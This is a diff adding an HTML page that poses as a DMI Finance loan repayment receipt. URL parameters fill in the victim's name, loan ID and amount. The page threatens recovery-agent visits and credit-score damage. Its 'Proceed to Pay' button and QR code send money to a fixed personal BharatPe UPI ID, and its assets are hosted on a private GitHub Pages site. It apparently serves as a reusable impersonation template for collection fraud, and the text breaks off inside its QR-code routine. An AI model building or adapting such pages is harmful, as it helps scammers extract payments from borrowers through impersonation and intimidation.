@@ -1,0 +1,1407 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DMI Finance - Repayment Receipt</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Titillium+Web:wght@600;700&display=swap" rel="stylesheet">
+  <style>
+    /* Global Reset & Base Typography */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Titillium Web', sans-serif;
+    }
+
+    body {
+      background-color: #2457F5;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      color: #111827;
+      padding-bottom: 28px;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* Mobile-First Centered Container */
+    .mobile-container {
+      width: 100%;
+      max-width: 440px;
+      padding: 0 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    /* Top Header Card */
+    .top-header {
+      background-color: #FFFFFF;
+      border-bottom-left-radius: 16px;
+      border-bottom-right-radius: 16px;
+      padding: 16px 16px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+    }
+
+    .logo-box {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .top-brand-logo {
+      height: 46px;
+      width: auto;
+      max-width: 240px;
+      object-fit: contain;
+      display: block;
+    }
+
+    /* Main Receipt Card */
+    .receipt-card {
+      background-color: #FFFFFF;
+      border-radius: 20px;
+      padding: 20px 18px 18px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+    }
+
+    .receipt-title {
+      font-size: 18px;
+      font-weight: 700;
+      letter-spacing: 0.9px;
+      color: #0F172A;
+      margin-bottom: 14px;
+      text-transform: uppercase;
+      text-align: left;
+    }
+
+    .detail-list {
+      display: flex;
+      flex-direction: column;
+      gap: 11px;
+    }
+
+    .detail-item {
+      display: flex;
+      align-items: flex-start;
+      justify-content: flex-start;
+      gap: 11px;
+    }
+
+    .icon-wrap {
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: -3px;
+      flex-shrink: 0;
+    }
+
+    .receipt-icon-img {
+      width: 30px;
+      height: 30px;
+      object-fit: contain;
+      display: block;
+    }
+
+    .detail-content {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      text-align: left;
+    }
+
+    .detail-label {
+      font-size: 9.5px;
+      font-weight: 600;
+      color: #6B7280;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      margin-bottom: 0px;
+      line-height: 1.1;
+    }
+
+    .detail-value {
+      font-size: 16px;
+      font-weight: 700;
+      color: #0F172A;
+      letter-spacing: 0.25px;
+      line-height: 1.12;
+      text-transform: uppercase;
+    }
+
+    .green-underline {
+      width: 38px;
+      height: 3.5px;
+      background-color: #00C853;
+      border-radius: 4px;
+      margin-top: 3px;
+    }
+
+    /* Contact Section inside Receipt */
+    .contact-section {
+      margin-top: 18px;
+      padding-left: 4px;
+      font-size: 11.5px;
+      color: #1F2937;
+    }
+
+    .contact-heading {
+      margin-bottom: 4px;
+      font-weight: 600;
+    }
+
+    .contact-heading strong {
+      font-weight: 700;
+    }
+
+    .contact-row {
+      display: flex;
+      justify-content: flex-start;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 16px;
+      font-weight: 600;
+      font-size: 11.5px;
+      color: #111827;
+    }
+
+    .contact-link {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      text-decoration: none;
+      color: #111827;
+    }
+
+    .contact-icon-img {
+      width: 15px;
+      height: 15px;
+      object-fit: contain;
+      display: block;
+      flex-shrink: 0;
+    }
+
+    /* Proceed To Pay Button */
+    .pay-btn {
+      width: 100%;
+      background-color: #1754D8;
+      color: #FFFFFF;
+      border: 2.5px solid #FFFFFF;
+      border-radius: 14px;
+      padding: 15px 14px;
+      font-size: 19px;
+      font-weight: 900;
+      letter-spacing: 1.1px;
+      text-shadow: 0 1px 1px rgba(0, 0, 0, 0.25);
+      -webkit-text-stroke: 0.35px #FFFFFF;
+      text-transform: uppercase;
+      cursor: pointer;
+      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15);
+      transition: transform 0.15s ease, background-color 0.15s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      line-height: 1.2;
+      position: relative;
+      overflow: hidden;
+      animation: proceedRippleLoop 2.2s ease-out infinite;
+    }
+
+    .pay-btn::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -120%;
+      width: 65%;
+      height: 100%;
+      background: linear-gradient(
+        90deg,
+        rgba(255, 255, 255, 0) 0%,
+        rgba(255, 255, 255, 0.28) 50%,
+        rgba(255, 255, 255, 0) 100%
+      );
+      transform: skewX(-20deg);
+      animation: proceedShineLoop 2.8s ease-in-out infinite;
+      pointer-events: none;
+    }
+
+    .pay-btn:hover {
+      animation-play-state: paused;
+    }
+
+    @keyframes proceedRippleLoop {
+      0% {
+        box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15), 0 0 0 0 rgba(255, 255, 255, 0.5);
+      }
+      70%, 100% {
+        box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15), 0 0 0 10px rgba(255, 255, 255, 0);
+      }
+    }
+
+    @keyframes proceedShineLoop {
+      0% {
+        left: -120%;
+      }
+      55%, 100% {
+        left: 145%;
+      }
+    }
+
+    .pay-btn:active {
+      transform: scale(0.98);
+      background-color: #1143B5;
+      animation: none;
+    }
+
+    /* Bottom Disclaimer Card */
+    .disclaimer-card {
+      background-color: #FFFFFF;
+      border-radius: 16px;
+      padding: 16px 16px 14px;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1);
+    }
+
+    .disclaimer-text {
+      font-size: 11.5px;
+      line-height: 1.42;
+      color: #1F2937;
+      text-align: justify;
+      margin-bottom: 12px;
+      font-weight: 600;
+    }
+
+    .disclaimer-text strong {
+      font-weight: 700;
+      color: #000000;
+    }
+
+    .footer-logos {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-top: 4px;
+      gap: 8px;
+    }
+
+    .mini-dmi {
+      display: flex;
+      align-items: center;
+      flex-shrink: 0;
+    }
+
+    .footer-brand-logo {
+      height: 20px;
+      width: auto;
+      max-width: 115px;
+      object-fit: contain;
+      display: block;
+    }
+
+    .payment-partners {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+    }
+
+    .bharatpe-text {
+      font-size: 10.5px;
+      font-weight: 700;
+      color: #1E293B;
+      display: flex;
+      align-items: center;
+      gap: 2px;
+    }
+
+    .bharatpe-text span {
+      color: #00B9F1;
+    }
+
+    .rupay-text {
+      font-size: 11.5px;
+      font-weight: 700;
+      font-style: italic;
+      color: #1D3B8B;
+      letter-spacing: -0.3px;
+    }
+
+    .rupay-arrow {
+      color: #F37021;
+    }
+
+    .visa-text {
+      font-size: 12.5px;
+      font-weight: 700;
+      font-style: italic;
+      color: #1A1F71;
+      letter-spacing: -0.5px;
+    }
+
+    .mc-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .mc-circles {
+      display: flex;
+      align-items: center;
+    }
+
+    .mc-red {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background-color: #EB001B;
+    }
+
+    .mc-orange {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background-color: #F79E1B;
+      margin-left: -5px;
+      opacity: 0.9;
+    }
+
+    .mc-label {
+      font-size: 5px;
+      font-weight: 700;
+      color: #374151;
+      margin-top: 1px;
+    }
+
+    /* Custom Payment Modal (Replaces alert) */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background-color: rgba(15, 23, 42, 0.65);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      z-index: 1000;
+      backdrop-filter: blur(2px);
+    }
+
+    .modal-overlay.active {
+      display: flex;
+    }
+
+    .modal-box {
+      background-color: #FFFFFF;
+      width: 100%;
+      max-width: 360px;
+      border-radius: 24px;
+      padding: 24px 20px;
+      text-align: center;
+      box-shadow: 0 20px 35px rgba(0, 0, 0, 0.25);
+      animation: popIn 0.2s ease-out;
+    }
+
+    @keyframes popIn {
+      from { transform: scale(0.92); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .modal-badge {
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      background-color: #EBF2FF;
+      color: #1754D8;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 14px;
+    }
+
+    .modal-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #0F172A;
+      margin-bottom: 6px;
+    }
+
+    .modal-desc {
+      font-size: 13.5px;
+      font-weight: 600;
+      color: #4B5563;
+      line-height: 1.45;
+      margin-bottom: 18px;
+    }
+
+    .modal-amount-box {
+      background-color: #F8FAFC;
+      border: 1px solid #E2E8F0;
+      border-radius: 14px;
+      padding: 12px;
+      margin-bottom: 18px;
+    }
+
+    .modal-amount-label {
+      font-size: 10.5px;
+      font-weight: 600;
+      color: #64748B;
+      text-transform: uppercase;
+    }
+
+    .modal-amount-val {
+      font-size: 21px;
+      font-weight: 700;
+      color: #0F172A;
+      margin-top: 2px;
+    }
+
+    .modal-actions {
+      display: flex;
+      gap: 10px;
+    }
+
+    .modal-btn {
+      flex: 1;
+      padding: 12px;
+      border-radius: 14px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      border: none;
+    }
+
+    .modal-btn-cancel {
+      background-color: #F1F5F9;
+      color: #334155;
+    }
+
+    .modal-btn-confirm {
+      background-color: #1754D8;
+      color: #FFFFFF;
+    }
+
+    .upi-uri-box {
+      background-color: #F1F5F9;
+      border: 1px dashed #94A3B8;
+      border-radius: 12px;
+      padding: 10px 12px;
+      font-size: 11px;
+      font-weight: 600;
+      color: #1E293B;
+      word-break: break-all;
+      text-align: left;
+      margin-bottom: 16px;
+    }
+
+    .upi-launch-link {
+      display: inline-block;
+      width: 100%;
+      text-decoration: none;
+      text-align: center;
+      background-color: #1754D8;
+      color: #FFFFFF;
+      padding: 12px;
+      border-radius: 14px;
+      font-size: 14px;
+      font-weight: 700;
+    }
+
+    .upi-copy-btn {
+      width: 100%;
+      background-color: #E2E8F0;
+      color: #0F172A;
+      padding: 11px;
+      border-radius: 14px;
+      font-size: 13px;
+      font-weight: 700;
+      border: none;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+
+    /* PC QR Payment Modal Styles */
+    .qr-modal-box {
+      background-color: #FFFFFF;
+      width: 100%;
+      max-width: 390px;
+      border-radius: 16px;
+      padding: 24px 22px 20px;
+      text-align: center;
+      box-shadow: 0 22px 44px rgba(0, 0, 0, 0.28);
+      animation: popIn 0.2s ease-out;
+    }
+
+    .qr-top-meta {
+      background-color: #F8FAFC;
+      border: 1px solid #E2E8F0;
+      border-radius: 12px;
+      padding: 12px 14px;
+      margin-bottom: 18px;
+      text-align: left;
+    }
+
+    .qr-customer-name {
+      font-size: 16px;
+      font-weight: 700;
+      color: #0F172A;
+      letter-spacing: 0.3px;
+      line-height: 1.25;
+      text-transform: uppercase;
+    }
+
+    .qr-loan-id {
+      font-size: 12.5px;
+      font-weight: 600;
+      color: #475569;
+      margin-top: 3px;
+      letter-spacing: 0.4px;
+      text-transform: uppercase;
+    }
+
+    .qr-code-frame {
+      width: 212px;
+      height: 212px;
+      margin: 0 auto 16px;
+      padding: 10px;
+      background-color: #FFFFFF;
+      border: 2px solid #E2E8F0;
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .qr-code-frame svg {
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
+
+    .qr-amount-bold {
+      font-size: 28px;
+      font-weight: 700;
+      color: #0F172A;
+      line-height: 1.15;
+      letter-spacing: 0.3px;
+    }
+
+    .qr-manager-caption {
+      font-size: 13px;
+      font-weight: 600;
+      color: #334155;
+      margin-top: 6px;
+      margin-bottom: 18px;
+      line-height: 1.35;
+    }
+
+    .qr-actions-row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .qr-btn-close {
+      width: 100%;
+      background-color: #1754D8;
+      color: #FFFFFF;
+      border: none;
+      border-radius: 12px;
+      padding: 11px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="mobile-container">
+    
+    <!-- Top White Header Card with Official DMI Finance Logo -->
+    <header class="top-header" id="header-logo-slot">
+      <div class="logo-box">
+        <img
+          src="https://www.dmifinance.in/wp-content/uploads/2026/05/Logo-final-RGB.svg"
+          alt="DMI Finance"
+          class="top-brand-logo"
+          onerror="this.onerror=null; this.src='https://placehold.co/210x52/ffffff/0B3B9C?text=DMI+FINANCE';"
+        />
+      </div>
+    </header>
+
+    <!-- Main Receipt Card -->
+    <main class="receipt-card">
+      <h1 class="receipt-title">REPAYMENT RECEIPT</h1>
+
+      <div class="detail-list">
+        <!-- 1. Account Holder -->
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img
+              id="icon-account-holder"
+              src="https://adnan369.github.io/dmifinance/brand/holder.png"
+              alt="Account Holder"
+              class="receipt-icon-img"
+              data-fallback="user"
+            />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">ACCOUNT HOLDER</span>
+            <span class="detail-value" id="holder-name">ROHIT KUMAR</span>
+          </div>
+        </div>
+
+        <!-- 2. Loan ID -->
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img
+              id="icon-loan-id"
+              src="https://adnan369.github.io/dmifinance/brand/loan.png"
+              alt="Loan ID"
+              class="receipt-icon-img"
+              data-fallback="loan"
+            />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">LOAN ID</span>
+            <span class="detail-value" id="loan-id">DMI0049457607</span>
+          </div>
+        </div>
+
+        <!-- 3. Bill Status -->
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img
+              id="icon-bill-status"
+              src="https://adnan369.github.io/dmifinance/brand/status.png"
+              alt="Bill Status"
+              class="receipt-icon-img"
+              data-fallback="status"
+            />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">BILL STATUS</span>
+            <span class="detail-value" id="bill-status">FULL &amp; FINAL SETTLEMENT</span>
+          </div>
+        </div>
+
+        <!-- 4. Bill Date -->
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img
+              id="icon-bill-date"
+              src="https://adnan369.github.io/dmifinance/brand/date.png"
+              alt="Bill Date"
+              class="receipt-icon-img"
+              data-fallback="date"
+            />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">BILL DATE</span>
+            <span class="detail-value" id="bill-date">28 NOVEMBER 2026</span>
+          </div>
+        </div>
+
+        <!-- 5. Bill Amount -->
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img
+              id="icon-bill-amount"
+              src="https://adnan369.github.io/dmifinance/brand/amount.png"
+              alt="Bill Amount"
+              class="receipt-icon-img"
+              data-fallback="amount"
+            />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">BILL AMOUNT</span>
+            <span class="detail-value" id="bill-amount">INR 3,000.00</span>
+            <div class="green-underline"></div>
+          </div>
+        </div>
+
+        <!-- 6. Collection Manager -->
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img
+              id="icon-collection-manager"
+              src="https://adnan369.github.io/dmifinance/brand/manager.png"
+              alt="Collection Manager"
+              class="receipt-icon-img"
+              data-fallback="manager"
+            />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">COLLECTION MANAGER</span>
+            <span class="detail-value" id="manager-name">MD ADNAN</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Contact Details -->
+      <div class="contact-section">
+        <p class="contact-heading">For any queries, please contact <strong>DMI Finance</strong></p>
+        <div class="contact-row">
+          <a href="tel:+917669818769" class="contact-link">
+            <img
+              src="https://adnan369.github.io/dmifinance/brand/chat.png"
+              alt="Contact"
+              class="contact-icon-img"
+              onerror="this.style.display='none'"
+            />
+            76698 18769
+          </a>
+          <a href="mailto:customercare@dmifinance.com" class="contact-link">
+            <img
+              src="https://adnan369.github.io/dmifinance/brand/mail.png"
+              alt="Email"
+              class="contact-icon-img"
+              onerror="this.style.display='none'"
+            />
+            customercare@dmifinance.com
+          </a>
+        </div>
+      </div>
+    </main>
+
+    <!-- Proceed To Pay Button -->
+    <button type="button" class="pay-btn" id="proceedPayBtn" onclick="openPaymentModal()">
+      PROCEED TO PAY
+    </button>
+
+    <!-- Bottom Disclaimer & Footer Logos Card -->
+    <footer class="disclaimer-card">
+      <p class="disclaimer-text">
+        <strong>DMI Finance</strong> loan account has been classified as a written-off case. Any payment you make will be reflected in your loan account within two to four weeks. To avoid a visit from recovery agents and a negative impact on your CIBIL score, please pay the full outstanding amount or close your loan at the earliest. For the exact outstanding amount and payment options, please contact DMI Finance through its official customer care channels.
+      </p>
+
+      <div class="footer-logos" id="footer-logos-slot">
+        <!-- Mini DMI Logo -->
+        <div class="mini-dmi">
+          <img
+            src="https://www.dmifinance.in/wp-content/uploads/2026/05/Logo-final-RGB.svg"
+            alt="DMI Finance"
+            class="footer-brand-logo"
+            onerror="this.onerror=null; this.src='https://placehold.co/110x26/ffffff/0B3B9C?text=DMI+FINANCE';"
+          />
+        </div>
+
+        <!-- Payment Partner Badges -->
+        <div class="payment-partners">
+          <div class="bharatpe-text">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+              <circle cx="12" cy="12" r="10" stroke="#00B9F1" stroke-width="2.5"/>
+              <path d="M8 10h8M8 14h6" stroke="#1E293B" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+            Bharat<span>Pe</span>
+          </div>
+          <div class="rupay-text">RuPay<span class="rupay-arrow">&#9656;</span></div>
+          <div class="visa-text">VISA</div>
+          <div class="mc-wrap">
+            <div class="mc-circles">
+              <div class="mc-red"></div>
+              <div class="mc-orange"></div>
+            </div>
+            <span class="mc-label">mastercard</span>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+  </div>
+
+  <!-- Interactive Payment Confirmation Modal -->
+  <div class="modal-overlay" id="paymentModal" onclick="closePaymentModal(event)">
+    <div class="modal-box" id="mobilePaymentBox" onclick="event.stopPropagation()">
+      <div class="modal-badge">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+          <path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h2 class="modal-title" id="modalTitle">Confirm Repayment</h2>
+      <p class="modal-desc" id="modalDesc">Proceeding to secure UPI payment for Loan ID <strong>DMI0049457607</strong>.</p>
+      <div class="modal-amount-box">
+        <div class="modal-amount-label">Payable Amount</div>
+        <div class="modal-amount-val" id="modalAmount">INR 3,000.00</div>
+      </div>
+      <div class="modal-actions" id="modalActions">
+        <button type="button" class="modal-btn modal-btn-cancel" onclick="closePaymentModal()">Cancel</button>
+        <button type="button" class="modal-btn modal-btn-confirm" onclick="confirmPayment()">Pay Now</button>
+      </div>
+    </div>
+
+    <!-- Desktop / PC QR Payment Modal Card -->
+    <div class="qr-modal-box" id="pcQrModalBox" style="display: none;" onclick="event.stopPropagation()">
+      <div class="qr-top-meta">
+        <div class="qr-customer-name" id="qrCustomerName">ROHIT KUMAR</div>
+        <div class="qr-loan-id" id="qrLoanId">LOAN ID: DMI0049457607</div>
+      </div>
+
+      <div class="qr-code-frame" id="qrCodeContainer" aria-label="UPI QR Code"></div>
+
+      <div class="qr-amount-bold" id="qrAmountDisplay">INR 3,000.00</div>
+      <div class="qr-manager-caption">Collection Manager Md Adnan From DMI Finance</div>
+
+      <div class="qr-actions-row">
+        <button type="button" class="qr-btn-close" onclick="closePaymentModal()">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ============================================================
+    // BRAND ICONS CONFIG (https://adnan369.github.io/dmifinance/brand/)
+    // ============================================================
+    const ICON_BASE_URL = 'https://adnan369.github.io/dmifinance/brand/';
+    const RECEIPT_ICONS = {
+      'icon-account-holder': 'holder.png',
+      'icon-loan-id': 'loan.png',
+      'icon-bill-status': 'status.png',
+      'icon-bill-date': 'date.png',
+      'icon-bill-amount': 'amount.png',
+      'icon-collection-manager': 'manager.png'
+    };
+
+    // Fixed Merchant UPI Configuration
+    const MERCHANT_UPI_ID = 'BHARATPE09917548991@yesbankltd';
+    const MERCHANT_PAYEE_NAME = 'DMI Finance';
+    const MERCHANT_TRANSACTION_NOTE = 'DMI Finance';
+
+    // Default values for the first 5 dynamic receipt fields
+    const DEFAULT_RECEIPT_FIELDS = {
+      name: 'ROHIT KUMAR',
+      loan: 'DMI0049457607',
+      status: 'FULL & FINAL SETTLEMENT',
+      date: '28 NOVEMBER 2026',
+      amount: 'INR 3,000.00'
+    };
+
+    // Clean inline SVG fallback agar network slow ho ya offline mode ho
+    const FALLBACK_SVGS = {
+      user: '<svg width="26" height="26" viewBox="0 0 24 24" fill="#000000"><path d="M12 12c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm0 2c-3.33 0-10 1.67-10 5v2h20v-2c0-3.33-6.67-5-10-5z"/></svg>',
+      loan: '<svg width="26" height="26" viewBox="0 0 24 24" fill="#000000"><rect x="4" y="3" width="16" height="18" rx="4" fill="#000000"/><rect x="8" y="11" width="8" height="2.2" rx="1" fill="#FFFFFF"/></svg>',
+      status: '<svg width="26" height="26" viewBox="0 0 24 24" fill="#000000"><path d="M4 3v18l3-2 3 2 2-2 2 2 3-2 3 2V3l-3 2-3-2-2 2-2-2-3 2-3-2zm4 5h8v2H8V8zm0 4h8v2H8v-2zm0 4h5v2H8v-2z"/></svg>',
+      date: '<svg width="26" height="26" viewBox="0 0 24 24" fill="#000000"><path d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V9h14v11z"/><path d="M12.5 11.5h-2v1.5h1v3.5h-1v1.5h3.5v-1.5h-1v-5z"/></svg>',
+      amount: '<svg width="27" height="27" viewBox="0 0 24 24" fill="#000000"><circle cx="12" cy="12" r="10" fill="#000000"/><path d="M9 7h6v1.5h-2.2c.4.4.7.9.8 1.5H15v1.5h-1.4c-.2 1.4-1.3 2.4-2.8 2.5l3.2 3.5h-2.1l-3-3.4V12.5h1.5c.9 0 1.6-.4 1.8-1H9V10h3.1c-.2-.6-.9-1-1.8-1H9V7z" fill="#FFFFFF"/></svg>',
+      manager: '<svg width="26" height="26" viewBox="0 0 24 24" fill="#000000"><rect x="3" y="3" width="18" height="18" rx="5" fill="#000000"/><path d="M9.5 15.5L6.5 12.5l1.4-1.4 1.6 1.6 4.6-4.6 1.4 1.4-6 6z" fill="#FFFFFF"/></svg>'
+    };
+
+    /**
+     * Detect whether the user is on a mobile/touch device vs PC/desktop browser
+     */
+    function isMobileDevice() {
+      const ua = navigator.userAgent || navigator.vendor || window.opera || '';
+      const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+      const coarsePointer = window.matchMedia && window.matchMedia('(pointer: coarse)').matches;
+      const narrowViewport = window.innerWidth <= 768;
+      return mobileRegex.test(ua) || (coarsePointer && narrowViewport);
+    }
+
+    /**
+     * Format raw or currency amount strings into consistent "INR X,XXX.XX" display format
+     */
+    function syncBillAmountDisplay(rawAmount) {
+      const cleanedText = String(rawAmount || '').trim();
+      const numericMatch = cleanedText.replace(/,/g, '').match(/\d+(?:\.\d+)?/);
+      if (!numericMatch) {
+        return DEFAULT_RECEIPT_FIELDS.amount;
+      }
+      const parsedNumber = parseFloat(numericMatch[0]);
+      if (Number.isNaN(parsedNumber) || parsedNumber <= 0) {
+        return DEFAULT_RECEIPT_FIELDS.amount;
+      }
+      const formattedNumber = parsedNumber.toLocaleString('en-IN', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      });
+      return 'INR ' + formattedNumber;
+    }
+
+    /**
+     * Extract numeric amount string (e.g. "3000.00") for UPI intent URI
+     */
+    function extractNumericUpiAmount(formattedAmount) {
+      const normalized = String(formattedAmount || '').replace(/,/g, '');
+      const match = normalized.match(/\d+(?:\.\d+)?/);
+      if (!match) return '3000.00';
+      const val = parseFloat(match[0]);
+      if (Number.isNaN(val) || val <= 0) return '3000.00';
+      return val.toFixed(2);
+    }
+
+    /**
+     * Build UPI intent URI: upi://pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=3000.00&cu=INR&tn=DMI%20Finance
+     */
+    function buildUpiIntentUri(formattedAmount) {
+      const amountParam = extractNumericUpiAmount(formattedAmount);
+      return (
+        'upi://pay?pa=' +
+        encodeURIComponent(MERCHANT_UPI_ID) +
+        '&pn=' +
+        encodeURIComponent(MERCHANT_PAYEE_NAME) +
+        '&am=' +
+        encodeURIComponent(amountParam) +
+        '&cu=INR&tn=' +
+        encodeURIComponent(MERCHANT_TRANSACTION_NOTE)
+      );
+    }
+
+    /**
+     * Apply receipt icons with automatic SVG fallback if an image fails to load
+     */
+    function applyReceiptIcons() {
+      Object.entries(RECEIPT_ICONS).forEach(([elementId, fileName]) => {
+        const imgEl = document.getElementById(elementId);
+        if (!imgEl) return;
+        const fallbackKey = imgEl.getAttribute('data-fallback');
+        imgEl.onerror = () => {
+          const parent = imgEl.parentElement;
+          if (parent && fallbackKey && FALLBACK_SVGS[fallbackKey]) {
+            parent.innerHTML = FALLBACK_SVGS[fallbackKey];
+          }
+        };
+        imgEl.src = ICON_BASE_URL + fileName;
+      });
+    }
+
+    /**
+     * Populate only the first 5 dynamic receipt fields from URL query parameters
+     */
+    function applyUrlParameters() {
+      try {
+        const params = new URLSearchParams(window.location.search);
+        const nameParam = params.get('name');
+        const loanParam = params.get('loan');
+        const statusParam = params.get('status');
+        const dateParam = params.get('date');
+        const amountParam = params.get('amount');
+
+        const holderEl = document.getElementById('holder-name');
+        const loanEl = document.getElementById('loan-id');
+        const statusEl = document.getElementById('bill-status');
+        const dateEl = document.getElementById('bill-date');
+        const amountEl = document.getElementById('bill-amount');
+
+        if (holderEl && nameParam && nameParam.trim()) {
+          holderEl.textContent = nameParam.trim().toUpperCase();
+        }
+        if (loanEl && loanParam && loanParam.trim()) {
+          loanEl.textContent = loanParam.trim().toUpperCase();
+        }
+        if (statusEl && statusParam && statusParam.trim()) {
+          statusEl.textContent = statusParam.trim().toUpperCase();
+        }
+        if (dateEl && dateParam && dateParam.trim()) {
+          dateEl.textContent = dateParam.trim().toUpperCase();
+        }
+        if (amountEl) {
+          const syncedAmount = syncBillAmountDisplay(
+            amountParam && amountParam.trim() ? amountParam.trim() : amountEl.textContent
+          );
+          amountEl.textContent = syncedAmount;
+        }
+      } catch (e) {
+        // Fallback to default values if query parsing is restricted
+      }
+    }
+
+    /**
+     * QR Code Generator (Versions 1..10, Byte mode, ECC Level M)
+     */
+    const QR_GF_EXP = new Uint8Array(512);
+    const QR_GF_LOG = new Uint8Array(256);
+    (() => {
+      let x = 1;
+      for (let i = 0; i < 255; i++) {
+        QR_GF_EXP[i] = x;
+        QR_GF_LOG[x] = i;
+        x <<= 1;
+        if (x & 0x100) x ^= 0x11d;
+      }
+      for (let i = 255; i < 512; i++) {
+        QR_GF_EXP[i] = QR_GF_EXP[i - 255];
+      }
+    })();
+
+    function qrGfMul(a, b) {
+      if (a === 0 || b === 0) return 0;
+      return QR_GF_EXP[(QR_GF_LOG[a] + QR_GF_LOG[b]) % 255];
+    }
+
+    function qrPolyMul(p, q) {
+      const res = new Uint8Array(p.length + q.length - 1);
+      for (let i = 0; i < p.length; i++) {
+        for (let j = 0; j < q.length; j++) {
+          res[i + j] ^= qrGfMul(p[i], q[j]);
+        }
+      }
+      return res;
+    }
+
+    function qrGeneratorPoly(ecLen) {
+      let poly = new Uint8Array([1]);
+      for (let i = 0; i < ecLen; i++) {
+        poly = qrPolyMul(poly, new Uint8Array([1, QR_GF_EXP[i]]));
+      }
+      return poly;
+    }
+
+    function qrCalcEc(data, ecLen) {
+      const gen = qrGeneratorPoly(ecLen);
+      const buf = new Uint8Array(data.length + ecLen);
+      buf.set(data);
+      for (let i = 0; i < data.length; i++) {
+        const factor = buf[i];
+        if (factor !== 0) {
+          for (let j = 0; j < gen.length; j++) {
+            buf[i + j] ^= qrGfMul(gen[j], factor);
+          }
+        }
+      }
+      return buf.slice(data.length);
+    }
+
+    function generateQrCodeSvg(text) {
+      const encoder = new TextEncoder();
+      const rawBytes = encoder.encode(String(text || ''));
+
+      const versions = [
+        [1, 21, 16, 10, 1],
+        [2, 25, 28, 16, 1],
+        [3, 29, 44, 26, 1],
+        [4, 33, 64, 18, 2],
+        [5, 37, 86, 24, 2],
+        [6, 41, 108, 16, 4],
+        [7, 45, 124, 18, 4],
+        [8, 49, 154, 22, 4],
+        [9, 53, 182, 22, 5],
+        [10, 57, 216, 26, 5]
+      ];
+
+      let chosen = versions[versions.length - 1];
+      for (const v of versions) {
+        const capacityBytes = v[2] - (v[0] < 10 ? 2 : 3);
+        if (rawBytes.length <= capacityBytes) {
+          chosen = v;
+          break;
+        }
+      }
+
+      const [ver, size, totalDataCw, ecCwPerBlock, numBlocks] = chosen;
+      const bits = [];
+      const pushBits = (val, len) => {
+        for (let i = len - 1; i >= 0; i--) {
+          bits.push((val >> i) & 1);
+        }
+      };
+
+      pushBits(0b0100, 4);
+      pushBits(rawBytes.length, ver < 10 ? 8 : 16);
+      for (const b of rawBytes) {
+        pushBits(b, 8);
